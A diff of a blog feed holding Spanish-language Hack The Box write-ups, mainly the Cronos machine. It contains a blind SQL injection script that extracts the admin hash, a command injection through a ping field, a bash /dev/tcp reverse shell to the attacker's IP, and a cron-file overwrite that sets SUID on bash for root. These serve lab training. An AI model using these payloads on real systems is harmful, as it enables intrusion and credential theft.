+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;' or if(substr((select password from users where username='admin'),&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,1)='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c',sleep(3),1)-- -&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Probando con: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fin del payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 database_password.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload: Fin del payload
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;admin]: 4f5fffa7b2340178a716e3832451e058
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos la contraseña hasheada del usuario &lt;strong&gt;admin&lt;/strong&gt;, así que vamos a ocupar la herramienta en linea &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; para crackearla; sin embargo, en esta ocación, no nos regresa un resultado, así que vamos a utilizar otro recurso online &lt;a href=&quot;https://hashes.com/en/decrypt/hash&quot;&gt;hashes&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/cronos-hash.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Contamos con credenciales de acceso, así que accedemos al panel y tenemos una utilidad que nos permite ejecutar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traceroute&lt;/code&gt; y un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt;; como es posible que dicho comando se ejecute a nivel de sistema, primero vamos a probar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; si lo recibimos en nuestra máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/cronos-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tun0 icmp
+tcpdump: verbose output suppressed, use &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;v]... &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;full protocol decode
+listening on tun0, link-type RAW &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Raw IP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, snapshot length 262144 bytes
+21:48:18.291432 IP cronos.htb &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.10.14.27: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;request, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;7587, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
+21:48:18.291575 IP 10.10.14.27 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; cronos.htb: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;reply, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;7587, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
+^C
+2 packets captured
+2 packets received by filter
+0 packets dropped by kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Recibimos la traza ICMP, por lo que podríamos pensar que tenemos la capacidad de ejecutar ciertos comandos aprovechando dicha herramienta.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping 8.8.8.8;whoami&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/cronos-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y vemos el resultado del comando que ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt;; por lo tanto tenemos ejecución de comandos, ahora nos entablamos una reverse shell a nuestro equipo, por lo que nos ponemos en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping 10.10.14.27&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.27/443 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.13] 42272
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1378&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+www-data@cronos:/var/www/admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;www-data
+www-data@cronos:/var/www/admin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt) y así que antes que nada, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ahora debemos encontrar una forma de escalar privilegios, por lo que vamos a enumerara un poco el sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@cronos:/home/noulis&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+www-data@cronos:/home/noulis&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
+www-data@cronos:/home/noulis&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+www-data@cronos:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+./bin/ping
+./bin/umount
+./bin/mount
+./bin/fusermount
+./bin/su
+./bin/ntfs-3g
+./bin/ping6
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/snapd/snap-confine
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/bin/chsh
+./usr/bin/newuidmap
+./usr/bin/sudo
+./usr/bin/chfn
+./usr/bin/newgrp
+./usr/bin/at
+./usr/bin/pkexec
+./usr/bin/newgidmap
+./usr/bin/gpasswd
+./usr/bin/passwd
+www-data@cronos:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada interesante, así que vamos a generar nuestro archivo de confianza &lt;a href=&quot;/procmon&quot;&gt;ProcMon&lt;/a&gt; para ver si se está realizando una tarea a intervalos regulares (que debería ya que el nombre de la máquina da pista a &lt;em&gt;cron&lt;/em&gt;)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@cronos:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./procmon.sh 
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; php /var/www/laravel/artisan schedule:run &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; php /var/www/laravel/artisan schedule:run
+&amp;lt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+&amp;lt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; php /var/www/laravel/artisan schedule:run &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1
+&amp;lt; php /var/www/laravel/artisan schedule:run
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/u4:2]
+^C
+www-data@cronos:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /var/www/laravel/artisan
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
+www-data@cronos:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y vemos que se está ejecutando a través de php el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/laravel/artisan&lt;/code&gt; del cual nosotros como &lt;strong&gt;www-data&lt;/strong&gt; somos propietario y podemos alterar su contenido; por lo tanto vamos a modificar su contenido a uno que nos permita convertirnos en &lt;strong&gt;root&lt;/strong&gt; (suponiendo que dicho usuario es quien realiza la tarea).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@cronos:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/www/laravel/artisan
+&amp;lt;?php
+        system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;chmod u+s /bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+?&amp;gt;
+www-data@cronos:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora esperamos que el usuario &lt;strong&gt;root&lt;/strong&gt; nos ejecute nuestro archivo y le otorgue permisos SUID a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@cronos:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
+&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1037528 Jun 24  2016 /bin/bash
+www-data@cronos:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+bash-4.3# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+bash-4.3#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="SQL" /><category term="DNS_Zone_Transfer" /><category term="SQLi" /><category term="Web" /><summary type="html">Resolución de la máquina Cronos en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Charon</title><link href="http://localhost:4000/htb-obscurity/" rel="alternate" type="text/html" title="Hack The Box Charon" /><published>2022-01-11T00:00:00-06:00</published><updated>2022-01-11T00:00:00-06:00</updated><id>http://localhost:4000/htb-obscurity</id><content type="html" xml:base="http://localhost:4000/htb-obscurity/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/banner-charon.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;charon&quot;&gt;Charon&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.31.&lt;/p&gt;
@@ -4900,802 +5498,4 @@ root@Shocker:/home/shelly#
 
 &lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;
 
-&lt;p&gt;Se comparte un script autopwn de la máquina &lt;a href=&quot;https://github.com/k4miyo/Shocker-Autopwn&quot;&gt;Shocker Autopwn&lt;/a&gt;.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Perl" /><category term="Injection" /><category term="Web" /><summary type="html">Resolución de la máquina Shocker en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box FriendZone</title><link href="http://localhost:4000/htb-friendzone/" rel="alternate" type="text/html" title="Hack The Box FriendZone" /><published>2021-12-12T00:00:00-06:00</published><updated>2021-12-12T00:00:00-06:00</updated><id>http://localhost:4000/htb-friendzone</id><content type="html" xml:base="http://localhost:4000/htb-friendzone/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/banner-friendzone.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;friendzone&quot;&gt;FriendZone&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.123.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.123
-PING 10.10.10.123 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.123&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.123: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;146 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.123 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 146.233/146.233/146.233/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.123 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-05 22:49 CST
-Initiating Ping Scan at 22:49
-Scanning 10.10.10.123 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 22:49, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 22:49
-Scanning 10.10.10.123 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.123
-Discovered open port 80/tcp on 10.10.10.123
-Discovered open port 139/tcp on 10.10.10.123
-Discovered open port 21/tcp on 10.10.10.123
-Discovered open port 443/tcp on 10.10.10.123
-Discovered open port 53/tcp on 10.10.10.123
-Discovered open port 445/tcp on 10.10.10.123
-Completed SYN Stealth Scan at 22:50, 35.56s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.123
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65528 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT    STATE SERVICE
-21/tcp  open  ftp
-22/tcp  open  ssh
-53/tcp  open  domain
-80/tcp  open  http
-139/tcp open  netbios-ssn
-443/tcp open  https
-445/tcp open  microsoft-ds
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;35.88 seconds
-           Raw packets sent: 68540 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.016MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68453 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.738MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.123
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,22,53,80,139,443,445
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
